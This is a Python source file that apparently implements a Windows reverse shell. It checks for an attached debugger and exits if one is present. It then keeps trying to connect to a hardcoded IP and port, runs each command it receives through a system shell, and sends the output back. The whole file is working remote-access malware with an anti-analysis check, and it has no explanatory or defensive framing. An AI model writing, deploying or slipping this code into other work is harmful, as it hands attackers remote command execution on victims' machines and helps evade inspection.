import socket
import subprocess
import os
import ctypes
import time

def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

def shell(sock):
    while True:
        try:
            #read data from socket
            buffer = sock.recv(1024)
            if not buffer:
                print("Connection closed by server.")
                break

            if buffer.startswith(b"q"):
                print("Exit command received. Shutting down.")
                sock.close()
                os._exit(0)
            else:
                # do command execution
                try:
                    process = subprocess.Popen(buffer.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    total_response = stdout + stderr
                    
                    # send result back to server
                    sock.sendall(total_response)
                except Exception as e:
                    error_message = f"Error executing command: {e}".encode()
                    sock.sendall(error_message)
        except socket.error as e: # handle socket errors
            print(f"Socket error: {e}")
            break

def main():
    if is_debugger_present():   # check for debugger
        print("Debugger detected! Exiting...")
        os._exit(1)
    else:
        print("No debugger detected. Running normally.")

    serv_ip = "192.168.3.189"
    serv_port = 50000

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect((serv_ip, serv_port))
            print("Connected to server.")
            break
        except socket.error:
            time.sleep(0.5)

    try: # start shell
        shell(sock)
    finally:
        sock.close()
        print("Connection closed.")

if __name__ == "__main__":
    main()
